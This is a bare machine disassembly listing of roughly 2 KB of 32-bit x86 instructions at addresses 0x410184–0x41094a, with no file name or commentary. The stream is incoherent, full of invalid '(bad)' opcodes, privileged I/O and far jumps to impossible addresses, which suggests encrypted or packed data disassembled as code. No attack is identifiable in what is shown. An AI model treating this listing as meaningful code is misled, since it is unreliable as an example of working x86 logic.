  410184:	out    0x6,al
  410186:	ror    BYTE PTR [ebp+edx*2-0x25563d5d],cl
  41018d:	sub    al,BYTE PTR [edx-0x585cb3a6]
  410193:	pop    ebx
  410194:	pop    ebx
  410195:	jnp    0x4101ef
  410197:	mov    edx,0xf4338001
  41019c:	iret   
  41019d:	add    eax,0x4f5db868
  4101a2:	adc    ebx,DWORD PTR [edx]
  4101a4:	gs jp  0x410191
  4101a7:	push   esp
  4101a8:	cmc    
  4101a9:	jns    0x4101b8
  4101ab:	inc    esi
  4101ac:	jge    0x410148
  4101ae:	jl     0x410172
  4101b0:	jecxz  0x41020c
  4101b2:	(bad)  
  4101b3:	add    eax,0x362e522d
  4101b8:	mov    ebx,0xb7d83b0b
  4101bd:	mov    esp,0xf4c81a5b
  4101c2:	push   cs
  4101c3:	loope  0x410154
  4101c5:	jmp    0xa66951f6
  4101ca:	dec    edx
  4101cb:	mov    edx,0x9bdfb400
  4101d0:	mov    cl,0x9d
  4101d2:	ja     0x4101c5
  4101d4:	das    
  4101d5:	clc    
  4101d6:	stos   BYTE PTR es:[edi],al
  4101d7:	and    BYTE PTR [edx],bh
  4101d9:	mov    ebx,0x27c32fc1
  4101de:	cmp    DWORD PTR [esi-0x75],edx
  4101e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e2:	push   edi
  4101e3:	fidiv  WORD PTR [ebx+0x33]
  4101e6:	push   cs
  4101e7:	dec    edi
  4101e8:	push   0x6d987b62
  4101ed:	or     al,0x8d
  4101ef:	mov    ah,0x75
  4101f1:	sbb    al,0x1d
  4101f3:	jns    0x4101dd
  4101f5:	pop    ss
  4101f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101f7:	or     ecx,edi
  4101f9:	cmp    BYTE PTR [edx-0x2b75a5a],ch
  4101ff:	add    DWORD PTR [esi-0x77],ebp
  410202:	or     al,dh
  410204:	pop    edx
  410205:	in     eax,0xbc
  410207:	repz xchg edx,eax
  410209:	adc    ch,BYTE PTR [ebp+ebx*4+0x66]
  41020d:	call   0x1530f87a
  410212:	outs   dx,BYTE PTR ds:[esi]
  410213:	jmp    0xa781:0x7bbe857a
  41021a:	mov    bh,0x85
  41021c:	cld    
  41021d:	and    al,0x99
  41021f:	(bad)
  410223:	(bad)  [edi-0x2add7de6]
  410229:	mov    edi,ecx
  41022b:	mov    ebp,0x20e2a70a
  410230:	bndstx [edi+esi*1],(bad)
  410234:	outs   dx,DWORD PTR ds:[esi]
  410235:	mov    DWORD PTR [ebp-0x4f],eax
  410238:	dec    ebp
  410239:	mov    esi,0x98093695
  41023e:	xor    edx,DWORD PTR [ebx]
  410240:	mov    ds:0x6183f590,al
  410245:	add    BYTE PTR [esi],dh
  410247:	jmp    0x410282
  410249:	pop    ebp
  41024a:	push   esp
  41024b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41024c:	cdq    
  41024d:	cmp    ecx,DWORD PTR [ebx-0x69b2c35a]
  410253:	stos   BYTE PTR es:[edi],al
  410254:	not    esp
  410256:	xor    al,0x2d
  410258:	loopne 0x410237
  41025a:	jl     0x410250
  41025c:	jnp    0x4102db
  41025e:	push   ss
  41025f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410260:	xlat   BYTE PTR ds:[ebx]
  410261:	test   BYTE PTR [ebx],dl
  410263:	test   DWORD PTR [edx+0x7c38ad25],edi
  410269:	mov    eax,ds:0xaa5af94a
  41026e:	mov    esi,0x463c12ad
  410273:	nop
  410274:	lock lock ret 0x6b61
  410279:	jmp    0xd069ed66
  41027e:	(bad)  
  41027f:	iret   
  410280:	out    0x5,eax
  410282:	add    edx,DWORD PTR fs:[ebp-0x167c0a9a]
  410289:	cs sbb eax,0xb19fc882
  41028f:	push   0x90adc78a
  410294:	push   ds
  410295:	into   
  410296:	sub    DWORD PTR [edx],ebx
  410298:	jno    0x410278
  41029a:	push   esi
  41029b:	adc    al,0x66
  41029d:	mov    edi,0xcb2618b2
  4102a2:	jne    0x4102a9
  4102a4:	pop    es
  4102a5:	inc    ebp
  4102a6:	int    0x4a
  4102a8:	mov    ds:0x9b0e957e,eax
  4102ad:	inc    eax
  4102ae:	mov    bh,0x44
  4102b0:	fwait
  4102b1:	push   ecx
  4102b2:	fld    DWORD PTR [ebx+edx*8+0x6c268a5f]
  4102b9:	out    dx,eax
  4102ba:	mov    DWORD PTR [ebp+0x68f3c2f2],ebx
  4102c0:	retf   0xe748
  4102c3:	into   
  4102c4:	mov    edi,0xea8f1f8d
  4102c9:	cmc    
  4102ca:	sahf   
  4102cb:	push   ds
  4102cc:	cmp    al,0x32
  4102ce:	dec    ecx
  4102cf:	mov    ebp,0x19207688
  4102d4:	mov    ah,BYTE PTR [ecx+0x5a]
  4102d7:	(bad)  
  4102d8:	sbb    al,0x30
  4102da:	sbb    eax,0x8ff32bdf
  4102df:	jl     0x4102a4
  4102e1:	dec    esi
  4102e2:	in     eax,0x8c
  4102e4:	int    0xba
  4102e6:	mov    bh,0xb2
  4102e8:	xchg   esp,eax
  4102e9:	into   
  4102ea:	shl    ah,1
  4102ec:	add    BYTE PTR [esi],bl
  4102ee:	in     eax,dx
  4102ef:	in     al,0x90
  4102f1:	xlat   BYTE PTR ds:[ebx]
  4102f2:	and    BYTE PTR [edi+0x33450c6f],0x31
  4102f9:	sub    esi,ebp
  4102fb:	push   ds
  4102fc:	inc    edx
  4102fd:	nop
  4102fe:	and    esi,DWORD PTR [ecx-0x5c]
  410301:	or     esi,ecx
  410303:	push   0x9bcaf31b
  410308:	ret    0xdeec
  41030b:	inc    edx
  41030c:	add    al,0xbc
  41030e:	sti    
  41030f:	into   
  410310:	and    eax,0x88c861b0
  410315:	or     bh,BYTE PTR [ebx+0x69a45a4b]
  41031b:	cmp    dh,BYTE PTR [esi-0x24ff951b]
  410321:	aad    0x6c
  410323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410324:	out    dx,eax
  410325:	mov    eax,0x3fc6c765
  41032a:	sub    DWORD PTR [edx+0x7b],esi
  41032d:	(bad)  
  41032f:	daa    
  410330:	jg     0x410347
  410332:	fcomi  st,st(6)
  410334:	add    bh,BYTE PTR [edi]
  410336:	pop    ebp
  410337:	sbb    ch,BYTE PTR [ebp+edx*8-0x48]
  41033b:	push   esi
  41033c:	jbe    0x4102cc
  41033e:	push   ecx
  41033f:	aas    
  410340:	rol    ebp,1
  410342:	xchg   ebp,eax
  410343:	retf   0x7831
  410346:	stos   BYTE PTR es:[edi],al
  410347:	rcr    al,cl
  410349:	popf   
  41034a:	cmp    ebx,edi
  41034c:	fs jmp 0x4f6c:0x8533920
  410354:	sub    al,0x8a
  410356:	or     al,bl
  410358:	inc    ebx
  410359:	inc    ecx
  41035a:	lods   al,BYTE PTR ds:[esi]
  41035b:	jp     0x4102f0
  41035d:	aas    
  41035e:	or     BYTE PTR [ebp-0x2217459],ah
  410364:	cmp    dl,BYTE PTR [eax]
  410366:	inc    ecx
  410367:	xchg   edi,eax
  410368:	jg     0x410336
  41036a:	mov    DWORD PTR [edx-0x46c8db31],0x2dc0fe5
  410374:	cld    
  410375:	cmp    DWORD PTR [edx-0x729ea9c7],esi
  41037b:	sbb    al,0x5e
  41037d:	or     ecx,edi
  41037f:	or     al,0x2c
  410381:	push   eax
  410382:	iret   
  410383:	inc    ecx
  410384:	push   ebp
  410385:	dec    eax
  410386:	xchg   DWORD PTR ds:0x384a442f,ecx
  41038c:	inc    eax
  41038d:	outs   dx,DWORD PTR ds:[esi]
  41038e:	cli    
  41038f:	lods   al,BYTE PTR ds:[esi]
  410390:	cmp    dl,BYTE PTR [esi]
  410392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410393:	cmp    edi,0xffffffa4
  410396:	jp     0x410329
  410398:	xor    bl,BYTE PTR [edx+0x14381b24]
  41039e:	mov    eax,ds:0xdf9c1e9d
  4103a3:	fs sbb eax,0xb7f649c6
  4103a9:	stos   BYTE PTR es:[edi],al
  4103aa:	pop    esi
  4103ab:	mov    WORD PTR [eax+ebx*1],gs
  4103ae:	inc    ecx
  4103af:	ins    DWORD PTR es:[edi],dx
  4103b0:	mov    esi,DWORD PTR es:[edi]
  4103b3:	mov    bl,BYTE PTR [edx+ebx*1+0x59]
  4103b7:	sbb    bl,dh
  4103b9:	mov    ch,0xc2
  4103bb:	popa   
  4103bc:	push   esi
  4103bd:	popa   
  4103be:	or     ebp,esp
  4103c0:	and    DWORD PTR [ecx+0x76],eax
  4103c3:	xchg   BYTE PTR [ebx+edi*1+0x5e],ah
  4103c7:	inc    ebp
  4103c8:	call   0x4b2cdea2
  4103cd:	popa   
  4103ce:	mov    dl,0xee
  4103d0:	add    DWORD PTR [esi-0x1a017d8f],eax
  4103d6:	jno    0x410406
  4103d8:	xchg   BYTE PTR [esi],ch
  4103da:	jl     0x410391
  4103dc:	push   cs
  4103dd:	pop    ebx
  4103de:	mov    edi,DWORD PTR [edx+ecx*8+0x5b]
  4103e2:	sub    eax,0xd9b805ce
  4103e7:	nop
  4103e8:	fs push ss
  4103ea:	xor    BYTE PTR [edx+esi*8],cl
  4103ed:	jo     0x410426
  4103ef:	sbb    eax,0x733f23e4
  4103f4:	jb     0x410469
  4103f6:	push   0x9
  4103f8:	xchg   ebx,eax
  4103f9:	xchg   ecx,eax
  4103fa:	dec    ebx
  4103fb:	outs   dx,BYTE PTR ds:[esi]
  4103fc:	aas    
  4103fd:	adc    DWORD PTR [ebx],eax
  4103ff:	ja     0x410463
  410401:	or     al,0x87
  410403:	inc    esp
  410404:	push   es
  410405:	aad    0xdf
  410407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410408:	inc    ecx
  410409:	mov    dh,0xa
  41040b:	lods   eax,DWORD PTR ds:[esi]
  41040c:	and    dl,BYTE PTR [ebx-0x70]
  41040f:	xchg   ecx,eax
  410410:	sub    BYTE PTR [esi+0x2eec8f94],ah
  410416:	xlat   BYTE PTR ds:[ebx]
  410417:	imul   dx,WORD PTR [eax],0x64c
  41041c:	pushf  
  41041d:	(bad)  
  41041f:	outs   dx,BYTE PTR ds:[esi]
  410420:	fimul  WORD PTR [edx+0x1fc29213]
  410426:	and    edi,DWORD PTR [ebx+0x2e6d7898]
  41042c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41042d:	adc    al,BYTE PTR [ecx-0x7714be4b]
  410433:	das    
  410434:	mov    ch,BYTE PTR [esp+ebp*2]
  410437:	ins    DWORD PTR es:[edi],dx
  410438:	push   ecx
  410439:	fcmovnu st,st(5)
  41043b:	mov    bh,0xe2
  41043d:	and    DWORD PTR [edi-0x29],ecx
  410440:	add    ecx,DWORD PTR [esi-0x58cf4558]
  410446:	push   ss
  410447:	cld    
  410448:	loope  0x41043d
  41044a:	popa   
  41044b:	std    
  41044c:	lods   al,BYTE PTR ds:[esi]
  41044d:	jmp    0x5b67166a
  410452:	inc    ebx
  410453:	sbb    BYTE PTR [ebp+edi*2-0x3a470816],0x8f
  41045b:	clc    
  41045c:	in     eax,dx
  41045d:	jmp    0xb2cce09a
  410462:	xchg   ecx,eax
  410463:	push   ds
  410464:	je     0x4103ea
  410466:	pop    ss
  410467:	sub    DWORD PTR [edi-0x19],0xc7eb610e
  41046e:	push   cs
  41046f:	add    ch,BYTE PTR [edx-0x7a]
  410472:	lea    edx,[edi]
  410474:	call   0x5bd9:0x17735fd4
  41047b:	das    
  41047c:	out    0x58,al
  41047e:	sbb    eax,0x8ca1e803
  410483:	daa    
  410484:	je     0x4104b4
  410486:	test   eax,0x111b1ae6
  41048b:	pop    esp
  41048c:	nop
  41048d:	jo     0x410476
  41048f:	jnp    0x41042c
  410491:	cmp    ch,al
  410493:	or     BYTE PTR [edx],bh
  410495:	repz push 0xdbf6dc65
  41049b:	or     cl,dl
  41049d:	pop    ds
  41049e:	jae    0x4104b5
  4104a0:	std    
  4104a1:	nop
  4104a2:	popf   
  4104a3:	lock sbb al,BYTE PTR [esi]
  4104a6:	adc    eax,0x1788fde5
  4104ab:	mov    bl,0x25
  4104ad:	pop    es
  4104ae:	lods   al,BYTE PTR ds:[esi]
  4104af:	loope  0x4104ce
  4104b1:	leave  
  4104b2:	ja     0x4104d0
  4104b4:	or     edx,DWORD PTR [ecx+0x285caced]
  4104ba:	and    eax,0xc70447c9
  4104bf:	fild   WORD PTR [esi]
  4104c1:	jo     0x4104fe
  4104c3:	imul   edx,DWORD PTR cs:[esi+esi*4+0x53d91f74],0x28
  4104cc:	stc    
  4104cd:	add    BYTE PTR [eax-0x20],al
  4104d0:	xor    al,BYTE PTR [esi+edx*1]
  4104d3:	cwde   
  4104d4:	sahf   
  4104d5:	cld    
  4104d6:	adc    al,0x93
  4104d8:	xchg   edi,eax
  4104d9:	popf   
  4104da:	xchg   edx,ecx
  4104dc:	and    BYTE PTR [edx-0x35],ah
  4104df:	adc    DWORD PTR [edi+0x35461144],0xd1904b91
  4104e9:	(bad)  ds:0xc8098c12
  4104ef:	retf   
  4104f0:	adc    BYTE PTR [eax+0x7484785],dl
  4104f6:	pushf  
  4104f7:	or     eax,0x8167c8ef
  4104fc:	jns    0x410535
  4104fe:	in     al,dx
  4104ff:	pop    ds
  410500:	scas   al,BYTE PTR es:[edi]
  410501:	fisub  WORD PTR [edx]
  410503:	shl    BYTE PTR [esi+0x73cedccd],1
  410509:	push   edx
  41050a:	push   ds
  41050b:	test   eax,0x1a498a1d
  410510:	data16 xor al,0x11
  410513:	loope  0x4104cc
  410515:	dec    esp
  410516:	repnz pop ebx
  410518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410519:	outs   dx,DWORD PTR ds:[esi]
  41051a:	pop    ds
  41051b:	cmc    
  41051c:	fcomp  DWORD PTR [esi]
  41051e:	jp     0x41056f
  410520:	aad    0xec
  410522:	dec    esi
  410523:	lahf   
  410524:	call   0xff92:0x904f2575
  41052b:	sub    DWORD PTR [esi+0x7f],0xffffffb3
  41052f:	sbb    edx,DWORD PTR [esi+0x6b]
  410532:	iret   
  410533:	xchg   DWORD PTR [eax-0x5d302d60],ebp
  410539:	das    
  41053a:	jmp    FWORD PTR [ecx]
  41053c:	jecxz  0x410504
  41053e:	cmc    
  41053f:	jg     0x4105af
  410541:	sub    BYTE PTR [ecx-0x648a6319],0x49
  410548:	pop    edx
  410549:	pop    ebx
  41054a:	imul   eax,DWORD PTR [eax-0x2f1c6c24],0xdf041e38
  410554:	or     dl,BYTE PTR [esi-0xc79a602]
  41055a:	mov    esp,0xe4cf1954
  41055f:	rol    BYTE PTR ds:0xed977c29,1
  410565:	lock stc 
  410567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410568:	adc    DWORD PTR [ebp+0xe8d88e1],ecx
  41056e:	cld    
  41056f:	cmp    ax,WORD PTR [esi*8-0x31929e96]
  410577:	add    al,0x19
  410579:	in     al,dx
  41057a:	mov    dh,0x47
  41057c:	sahf   
  41057d:	jne    0x41059f
  41057f:	dec    edx
  410580:	mov    ah,0x18
  410582:	cs jo  0x41057b
  410585:	pusha  
  410586:	scas   eax,DWORD PTR es:[edi]
  410587:	and    ebx,DWORD PTR [ebx-0x6119bf80]
  41058d:	lods   al,BYTE PTR ds:[esi]
  41058e:	aad    0x61
  410590:	cmp    dl,BYTE PTR [edx]
  410592:	fdivr  DWORD PTR [edx]
  410594:	or     al,0xea
  410596:	pop    esi
  410597:	dec    ebp
  410598:	ja     0x410545
  41059a:	sub    eax,0xc27a71ac
  41059f:	mov    ds:0x7d365c1b,al
  4105a4:	je     0x41058d
  4105a6:	xor    dh,ah
  4105a8:	pop    ecx
  4105a9:	jns    0x41057e
  4105ab:	push   esp
  4105ac:	mov    ebp,0x6ca42e3d
  4105b1:	pop    DWORD PTR [eax-0x5c285f9b]
  4105b7:	jg     0x4105e8
  4105b9:	adc    BYTE PTR [edx+ebp*2+0x2e],bl
  4105bd:	fwait
  4105be:	test   BYTE PTR [edi+0xcb50728],bl
  4105c4:	adc    al,0xe7
  4105c6:	jnp    0x410646
  4105c8:	jle    0x4105ff
  4105ca:	lea    esp,[ecx+0x31]
  4105cd:	pop    esi
  4105ce:	sbb    al,0x8e
  4105d0:	lods   al,BYTE PTR ds:[esi]
  4105d1:	jmp    0x410586
  4105d3:	scas   al,BYTE PTR es:[edi]
  4105d4:	pop    edx
  4105d5:	xchg   ecx,eax
  4105d6:	lock ds mov ebx,0x95b766c8
  4105dd:	mov    cl,0x66
  4105df:	inc    ebx
  4105e0:	adc    DWORD PTR [ebp-0x2217e4cf],esi
  4105e6:	xchg   ebp,eax
  4105e7:	push   cs
  4105e8:	mov    ebx,0xb932edd4
  4105ed:	sub    al,0xd0
  4105ef:	cmp    DWORD PTR [edi-0x4f],ebx
  4105f2:	into   
  4105f3:	inc    edi
  4105f4:	inc    esi
  4105f5:	loopne 0x41064d
  4105f7:	inc    edi
  4105f8:	jl     0x410670
  4105fa:	or     BYTE PTR ds:0x6ef5c117,bh
  410600:	push   ss
  410601:	mov    ds:0xe4d863ee,al
  410606:	dec    ebp
  410607:	rcr    BYTE PTR gs:[esi-0x72],cl
  41060b:	jb     0x410650
  41060d:	aas    
  41060e:	push   cs
  41060f:	mov    bh,0x22
  410611:	push   0x8aa40fb5
  410616:	mov    al,ds:0x567c89bd
  41061b:	inc    ebx
  41061c:	sbb    al,ah
  41061e:	mov    ds:0x51d13596,al
  410623:	jnp    0x410625
  410625:	mov    ch,0xfe
  410627:	lahf   
  410628:	inc    ecx
  410629:	ror    BYTE PTR [ebp+ebx*1-0x1fd0ac50],cl
  410630:	push   esp
  410631:	ins    DWORD PTR es:[edi],dx
  410632:	(bad)  
  410633:	push   ebp
  410634:	cs (bad) 
  410636:	ins    DWORD PTR es:[edi],dx
  410637:	loope  0x410664
  410639:	mov    eax,0x5e1eae54
  41063e:	mov    esp,DWORD PTR [esi]
  410640:	dec    esi
  410641:	icebp  
  410642:	icebp  
  410643:	pop    ebx
  410644:	push   ds
  410645:	add    BYTE PTR [ebx],0x6d
  410648:	push   es
  410649:	push   ebx
  41064a:	(bad)  [ebx+0xd4ac317]
  410650:	dec    ebx
  410651:	dec    esp
  410652:	daa    
  410653:	shl    DWORD PTR [ecx-0x3b],cl
  410656:	fs icebp 
  410658:	out    0x97,al
  41065a:	mov    esi,0x49083b2a
  41065f:	fmul   DWORD PTR [edi+0x5a]
  410662:	inc    edx
  410663:	mov    al,0x71
  410665:	add    bh,BYTE PTR [edx]
  410667:	loop   0x410668
  410669:	ins    DWORD PTR es:[edi],dx
  41066a:	xchg   DWORD PTR [si],eax
  41066d:	or     BYTE PTR [ecx],bh
  41066f:	push   esi
  410670:	stos   DWORD PTR es:[edi],eax
  410671:	jecxz  0x410689
  410673:	sbb    eax,0xfc6340f7
  410678:	test   BYTE PTR ds:0xe6c47dab,al
  41067e:	mov    ebp,0xc00b6345
  410683:	call   FWORD PTR [ebx]
  410685:	dec    esp
  410686:	push   cs
  410687:	cmp    edi,eax
  410689:	xlat   BYTE PTR ds:[ebx]
  41068a:	add    eax,0x237d9c72
  41068f:	addr16 mov dl,0xc8
  410692:	iret   
  410693:	sbb    DWORD PTR [ebx],eax
  410695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410696:	sub    dh,dh
  410698:	push   esp
  410699:	nop
  41069a:	ror    DWORD PTR [ecx],0x8d
  41069d:	(bad)  
  41069e:	and    al,0x9a
  4106a0:	cmp    edx,edi
  4106a2:	clc    
  4106a3:	mov    eax,ds:0x5fa9fbb6
  4106a8:	inc    edi
  4106a9:	push   ss
  4106aa:	sub    cl,ah
  4106ac:	test   al,0xe
  4106ae:	(bad)  
  4106af:	imul   edx,DWORD PTR [ebp-0x27],0xf22dcdb4
  4106b6:	sub    ah,BYTE PTR [ecx+0x27]
  4106b9:	mov    eax,0xa0ae5702
  4106be:	ret    
  4106bf:	sbb    al,0x3b
  4106c1:	adc    DWORD PTR [ebx],edx
  4106c3:	pop    ss
  4106c4:	or     ebx,esi
  4106c6:	lods   al,BYTE PTR ds:[esi]
  4106c7:	ja     0x410711
  4106c9:	fsub   QWORD PTR [esi-0x1031415]
  4106cf:	push   edx
  4106d0:	dec    edi
  4106d1:	sbb    eax,0x1015e2d7
  4106d6:	aam    0xa5
  4106d8:	push   edi
  4106d9:	aas    
  4106da:	stc    
  4106db:	popf   
  4106dc:	push   ecx
  4106dd:	out    dx,eax
  4106de:	ret    0x4d8e
  4106e1:	xchg   esp,eax
  4106e2:	inc    esi
  4106e3:	mov    bh,0xf2
  4106e5:	mov    BYTE PTR [ecx-0x39af486],dl
  4106eb:	pop    esi
  4106ec:	aaa    
  4106ed:	push   ebx
  4106ee:	sub    DWORD PTR [edx+0x51be9e33],esp
  4106f4:	jp     0x410756
  4106f6:	(bad)  
  4106f7:	clc    
  4106f8:	ins    BYTE PTR es:[edi],dx
  4106f9:	arpl   WORD PTR [ecx-0x7a],dx
  4106fc:	mov    edi,0x7044f191
  410701:	sub    al,0x68
  410703:	fnstsw WORD PTR [edx]
  410705:	(bad)  
  410707:	push   ds
  410708:	xor    eax,0x12520c2d
  41070d:	mov    al,0x2d
  41070f:	or     eax,0x1476e016
  410714:	sahf   
  410715:	aaa    
  410716:	cmp    edx,DWORD PTR [eax+0x74]
  410719:	sbb    al,0xe8
  41071b:	and    ebp,esi
  41071d:	pop    ecx
  41071e:	ins    DWORD PTR es:[edi],dx
  41071f:	into   
  410720:	fsubr  QWORD PTR [ecx+0x64]
  410723:	je     0x4106d5
  410725:	push   ss
  410726:	(bad)  
  410728:	out    dx,al
  410729:	stos   BYTE PTR es:[edi],al
  41072a:	mov    al,ah
  41072c:	and    BYTE PTR [eax+eiz*8-0x11],dl
  410730:	out    0x51,eax
  410732:	mov    cl,bh
  410734:	cwde   
  410735:	or     DWORD PTR [ebx+0x774ae718],0xffffff91
  41073c:	xchg   DWORD PTR [ecx],ebp
  41073e:	pop    ss
  41073f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410740:	xlat   BYTE PTR ds:[ebx]
  410741:	rcl    BYTE PTR [esi],0xc7
  410744:	in     eax,0xb6
  410746:	and    ecx,DWORD PTR [ebx+edi*1]
  410749:	mov    ah,BYTE PTR [ebp+0x1]
  41074c:	xor    BYTE PTR [ecx+0x163607c6],ah
  410752:	and    al,0x87
  410754:	sbb    al,0x9
  410756:	cwde   
  410757:	sub    ah,BYTE PTR [ebp+0xf]
  41075a:	pop    ss
  41075b:	out    dx,al
  41075c:	(bad)  
  41075d:	into   
  41075e:	int    0x19
  410760:	pop    esp
  410761:	test   al,0xd8
  410763:	jbe    0x41076b
  410765:	or     esi,DWORD PTR [edx+eax*1]
  410768:	cmp    DWORD PTR [ebp+eax*4+0x21],esp
  41076c:	xor    eax,0x2ab2195c
  410771:	test   DWORD PTR [ebp-0x77],0x87459aa1
  410778:	mov    esp,0x95837176
  41077d:	rol    bl,0xf3
  410780:	lahf   
  410781:	int3   
  410782:	cwde   
  410783:	out    0xa3,al
  410785:	ja     0x41079b
  410787:	jnp    0x410788
  410789:	sbb    ebx,ecx
  41078b:	push   edx
  41078c:	pushf  
  41078d:	inc    esp
  41078e:	sbb    DWORD PTR [ebx+0x58a6c0f7],0x3b
  410795:	xchg   esi,eax
  410796:	push   edi
  410797:	push   es
  410798:	ds icebp 
  41079a:	not    DWORD PTR [ecx-0x11]
  41079d:	mov    edi,0x5a83e637
  4107a2:	int3   
  4107a3:	xchg   esi,eax
  4107a4:	es push esi
  4107a6:	scas   al,BYTE PTR es:[edi]
  4107a7:	mov    ebp,0x239205c1
  4107ac:	out    dx,eax
  4107ad:	icebp  
  4107ae:	adc    BYTE PTR [ecx],cl
  4107b0:	loop   0x410758
  4107b2:	inc    edx
  4107b4:	scas   eax,DWORD PTR es:[edi]
  4107b5:	cmp    al,0x43
  4107b7:	repz ja 0x41078b
  4107ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107bb:	imul   edx,DWORD PTR [ecx+0x74],0x31
  4107bf:	push   eax
  4107c0:	imul   edi,DWORD PTR [ecx],0xffffffa1
  4107c3:	jle    0x41077f
  4107c5:	inc    edx
  4107c6:	or     DWORD PTR [esi+0x6b3f09e1],ebx
  4107cc:	adc    al,0x57
  4107ce:	stc    
  4107cf:	add    eax,DWORD PTR [bp+di-0x2d]
  4107d3:	add    eax,0xf7336704
  4107d8:	jle    0x410831
  4107da:	dec    ecx
  4107db:	std    
  4107dc:	sub    BYTE PTR [esi-0x688fac5a],cl
  4107e2:	push   edi
  4107e3:	int    0x33
  4107e5:	cs inc ebx
  4107e7:	xchg   ebx,eax
  4107e8:	and    BYTE PTR [ecx+0x6f2e4f14],0xc0
  4107ef:	std    
  4107f0:	cdq    
  4107f1:	test   eax,0x4f849093
  4107f6:	(bad)  
  4107f7:	loop   0x41080a
  4107f9:	mov    bh,0xc7
  4107fb:	ins    BYTE PTR es:[edi],dx
  4107fc:	arpl   WORD PTR [eax+0x5ca573c5],di
  410802:	(bad)  
  410803:	aam    0xb8
  410805:	outs   dx,DWORD PTR ds:[esi]
  410806:	mov    es,ebp
  410808:	jge    0x410866
  41080a:	call   0x84e1:0xfdf57079
  410811:	mov    bh,BYTE PTR [eax]
  410813:	cmp    al,0xd9
  410815:	loopne 0x410834
  410817:	sahf   
  410818:	or     edi,0x6d01c134
  41081e:	add    al,0xff
  410820:	jnp    0x4107ee
  410822:	xchg   DWORD PTR [eax-0x747e59e2],edi
  410828:	xor    dl,BYTE PTR [ebx]
  41082a:	sahf   
  41082b:	jecxz  0x4107c0
  41082d:	mov    cs,WORD PTR [ebx]
  41082f:	jmp    0x410872
  410831:	and    bh,BYTE PTR [eax+0x4d]
  410834:	ficomp WORD PTR [ecx+esi*1]
  410837:	mov    edx,0x567b9300
  41083c:	je     0x410801
  41083e:	ins    BYTE PTR es:[edi],dx
  41083f:	nop
  410840:	inc    edi
  410841:	sbb    BYTE PTR [edx+0x42b346b2],0x76
  410848:	and    dl,bl
  41084a:	adc    BYTE PTR [ebp-0x57],0xf2
  41084e:	hlt    
  41084f:	sbb    al,0x97
  410851:	outs   dx,BYTE PTR ds:[esi]
  410852:	dec    ebp
  410853:	sbb    ebp,edx
  410855:	out    0x76,al
  410857:	xor    eax,0xdfbe7120
  41085c:	lea    ebp,[eax]
  41085e:	or     edx,DWORD PTR [edx-0x2a1c2538]
  410864:	leave  
  410865:	pop    ebx
  410866:	enter  0x2ab2,0x27
  41086a:	sar    bl,0xbc
  41086d:	pusha  
  41086e:	in     al,0x80
  410870:	inc    esp
  410871:	mov    BYTE PTR [ecx+0x2b270571],dl
  410877:	shr    DWORD PTR [edx+0x6f],1
  41087a:	jecxz  0x4108aa
  41087c:	inc    esi
  41087d:	mov    ebp,0x5fad724f
  410882:	push   ecx
  410883:	loopne 0x41085c
  410885:	retf   
  410886:	sar    DWORD PTR [ebx+0x37],cl
  410889:	inc    ebx
  41088a:	dec    esp
  41088b:	hlt    
  41088c:	fild   QWORD PTR [esi-0x11]
  41088f:	mov    eax,0x7a7972e0
  410894:	fwait
  410895:	jae    0x4108b8
  410897:	sbb    bl,0xee
  41089a:	and    BYTE PTR [esi],ah
  41089c:	ret    0xd531
  41089f:	xchg   edx,eax
  4108a0:	leave  
  4108a1:	add    eax,esp
  4108a3:	je     0x4108c8
  4108a5:	cmp    bh,bl
  4108a7:	sbb    eax,0xfa553f12
  4108ac:	sbb    eax,0x8bbff0f1
  4108b1:	loopne 0x41087c
  4108b3:	scas   eax,DWORD PTR es:[edi]
  4108b4:	loope  0x410864
  4108b6:	mov    edx,0xa6b4fa14
  4108bb:	xchg   esp,eax
  4108bc:	and    al,0x50
  4108be:	mov    eax,ds:0xdf5929a0
  4108c3:	mov    dh,bh
  4108c5:	fsub   DWORD PTR [eax+0xa4c9577]
  4108cb:	dec    edx
  4108cc:	or     DWORD PTR [esi],0xe3d12d8e
  4108d2:	pop    edi
  4108d3:	xor    BYTE PTR [edi],bl
  4108d5:	arpl   WORD PTR [ecx],si
  4108d7:	enter  0xcfba,0xbe
  4108db:	imul   edi,DWORD PTR [ebx+0x0],0x321c381a
  4108e2:	das    
  4108e3:	xchg   cx,ax
  4108e5:	mov    ah,0x27
  4108e7:	hlt    
  4108e8:	cmp    DWORD PTR [edx],esp
  4108ea:	dec    ebp
  4108eb:	mov    bl,0xb2
  4108ed:	cs push edi
  4108ef:	ret    0xd7f4
  4108f2:	xor    BYTE PTR [edx+edx*2],ah
  4108f5:	inc    ecx
  4108f6:	and    bh,BYTE PTR [eax-0x3b]
  4108f9:	fsub   DWORD PTR ds:0x4008d333
  4108ff:	add    BYTE PTR [eax],bl
  410901:	inc    edi
  410902:	addr16 cmp di,ax
  410906:	lds    ebp,FWORD PTR ds:0x9018bc65
  41090c:	pop    es
  41090d:	sar    BYTE PTR [ebx],0x5b
  410910:	imul   ebx,DWORD PTR [edi],0x0
  410913:	or     BYTE PTR [esp+ebx*1],bl
  410916:	cmc    
  410917:	cmp    ebp,DWORD PTR [ebx+0x7dd9c7fc]
  41091d:	jg     0x410949
  41091f:	mov    eax,ebx
  410921:	sub    DWORD PTR [ecx-0x64d0427a],eax
  410927:	pop    es
  410928:	scas   al,BYTE PTR es:[edi]
  410929:	mov    bl,0xb0
  41092b:	or     bh,BYTE PTR [edx]
  41092d:	and    al,0x8
  41092f:	jns    0x410974
  410931:	ss fld st(7)
  410934:	retf   
  410935:	add    eax,0x4555513f
  41093a:	mov    bh,0xdf
  41093c:	adc    eax,0x662cd9a1
  410941:	loopne 0x410962
  410943:	xor    bl,BYTE PTR [edi-0x3f]
  410946:	and    al,0xcd
  410948:	mov    ds,edx
  41094a:	sti    
